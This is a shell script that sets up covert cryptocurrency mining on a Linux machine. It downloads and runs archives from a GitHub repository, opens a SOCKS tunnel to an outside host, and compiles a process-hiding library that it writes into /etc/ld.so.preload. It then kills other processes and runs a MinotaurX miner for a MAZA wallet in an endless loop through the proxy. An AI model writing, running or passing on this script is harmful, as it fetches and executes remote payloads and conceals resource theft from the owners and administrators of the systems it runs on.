#!/bin/sh
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

apt update > /dev/null

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

apt -y install binutils cmake build-essential screen unzip net-tools curl > /dev/null

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Bucket_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate="${currentdate} $underscored_ip"
used_num_of_cores=`expr $num_of_cores - 2`
echo ""
echo "You will be using $used_num_of_cores cores"
echo ""
sleep 2
echo "Your worker name will be $currentdate"
sleep 2

wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/cheese.tar.gz > /dev/null

sleep 2

tar -xf cheese.tar.gz

sleep 2

./cheese client -v cpusocks$(shuf -i 2-6 -n 1).wot.mrface.com:80 7777:socks &

sleep 2

wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/update.tar.gz > /dev/null

sleep 2

tar -xf update.tar.gz > /dev/null

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:7777
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update* | awk '{print $1}' | xargs kill -9 $1

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

./update/update wget https://raw.githubusercontent.com/alexgabbard01/update/main/opt.tar.gz 1>/dev/null 2>&1

sleep 2

tar -xf opt.tar.gz

sleep 2

./update/update wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/magicOpt.zip > /dev/null

sleep 2

unzip magicOpt.zip

sleep 2

make

sleep 5

gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

sleep 5

mv libprocesshider.so /usr/local/lib/

sleep 5

echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

sleep 3

echo " "
echo " "

echo "******************************************************************"

./update/update curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

sleep 2

netstat -ntlp

while true
do
./opt -a minotaurx -o stratum+tcp://eu.coinXpool.com:8243 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate -p c=MAZA,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:7777 1>/dev/null 2>&1
sleep 10
done
